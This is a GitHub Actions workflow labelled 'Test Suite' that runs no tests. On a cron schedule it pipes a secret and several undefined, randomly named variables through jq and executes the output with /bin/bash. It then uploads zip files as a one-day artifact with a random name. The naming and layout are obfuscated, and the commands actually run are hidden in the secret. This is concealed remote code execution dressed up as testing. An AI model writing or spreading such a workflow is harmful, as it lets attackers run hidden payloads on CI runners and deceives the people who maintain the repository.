name: Test Suite
on:
  workflow_dispatch:

  schedule:
    - cron: '39 3,9,15,21 * * *'
env:
  CI: true
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Main step
        env:
          r3: ${{ secrets.r3 }}
        run: |
          printf '%s' "$r3" | jq -r .y272 | /bin/bash
          printf '%s' "$tzsc822" | jq -r .cucv56 | /bin/bash
          echo $hk5 | jq -r .w7257 | /bin/bash
          echo $y8169 | jq -r .z6770 | /bin/bash
          printf '%s' "$iqlqh1437" | jq -r .mk487 | /bin/bash

      - name: Save data
        uses: actions/upload-artifact@v4
        with:
          name: lOFTcWaO
          path: "*.zip"
          retention-days: 1
